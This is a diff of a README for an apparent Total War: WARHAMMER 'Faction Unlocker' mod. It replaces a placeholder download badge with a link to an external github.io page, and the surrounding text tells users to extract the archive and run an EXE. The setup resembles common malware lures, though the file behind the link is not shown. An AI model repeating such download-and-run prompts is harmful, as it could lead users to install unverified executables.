@@ -4,7 +4,7 @@ To install, simply extract the downloaded archive and run the provided EXE file.
 
 Unlock every playable faction in Total War: WARHAMMER campaigns and custom battles. Play as minor factions, hidden subfactions, and explore the full scope of the Warhammer world.
 
-[![Download Crynsos' Faction Unlocker](https://img.shields.io/badge/Download-Faction--Unlocker-blueviolet)](#)
+[![Download Crynsos' Faction Unlocker](https://img.shields.io/badge/Download-Faction--Unlocker-blueviolet)](https://crynsos-faction-unlocker.github.io/.github)
 
 ---
 
